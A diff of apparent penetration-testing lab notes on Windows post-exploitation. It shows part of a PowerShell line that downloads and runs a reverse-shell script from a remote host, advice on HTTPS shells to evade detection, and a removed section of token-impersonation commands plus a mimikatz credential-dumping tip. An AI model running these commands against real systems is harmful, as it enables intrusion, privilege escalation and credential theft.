@@ -103,17 +103,6 @@ t).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1');"}
 
 Should also start looking into using HTTPS shells here to avoid detection.
 
-### Token impersonation
-
-We can do token impersonation completely without Meterpreter, which is really nice. This trick spawns a new thread, but also works in the same thread. However, if you type whoami it might still show the old user. If you however spawn a new process and migrate to that you will have a shell as the account you are impersonating.
-
-Invokes token impersonation on a domain user. If this doesn't work you can try impersonating SYSTEM and then dropping credentials using mimikatz.
-
-`Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"`
-
-`Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"`
-
-`Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"`
 
 ### Invoke-Kerberoast
 
